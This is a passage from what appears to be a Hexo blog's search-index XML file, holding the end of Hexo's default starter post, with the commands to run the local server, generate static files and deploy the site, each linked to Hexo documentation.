<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
</search>
